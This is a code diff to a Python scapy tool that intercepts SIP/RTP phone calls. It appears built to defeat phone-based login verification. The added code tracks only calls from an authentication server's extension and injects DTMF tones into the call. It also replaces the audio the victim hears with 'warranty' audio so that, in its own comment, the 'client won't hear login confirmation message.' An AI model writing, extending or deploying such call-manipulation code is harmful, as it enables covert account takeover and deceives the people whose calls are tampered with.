@@ -6,9 +6,12 @@ import scapy.sendrecv
 from conversation import *
 import logging
 
+SERVER_EXT = "0000" #Changeme
+
 cstore = convostore()
 
-gb = girlboss()
+gb = girlboss("assets/warranty.wav")
+bg = girlboss("assets/dtmf.wav")
 
 convolist: List[conversation]
 convolist = []
@@ -34,14 +37,21 @@ def gatekeep(pkt: Packet):
                         cstore.lock.release()
                         break
             elif parsed["message"] == "INVITE":
+                if parsed["From_ext"] != SERVER_EXT:
+                    # Ignore calls that aren't from auth server
+                    return True
                 logging.info("Got new call to ext. {}".format(parsed["To_ext"]))
                 cstore.lock.acquire()
                 cstore.conversations.append(conversation(parsed))
                 cstore.lock.release()
             # We don't have to keep track of the other SIP packets once we associate ext to IP
         case "RTP":
-            return True
-            # Don't manipulate server->client comms
+            c: conversation
+            for c in cstore.conversations:
+                if c.get_enforce() == 2:
+                    return gb.manipulateg(pkt)
+            # After we start packet injection, change incoming audio to innocuous
+            # So client won't hear login confirmation message
     return True
 
 
@@ -64,11 +74,10 @@ def keepgate(pkt: Packet):
                         break
             return True
         case "RTP":
-            unk = True
             c: conversation
             for c in cstore.conversations:
                 if c.get_enforce() == 2:
-                    return gb.manipulate(pkt)
+                    return bg.manipulate(pkt)
                 continue 
 
 
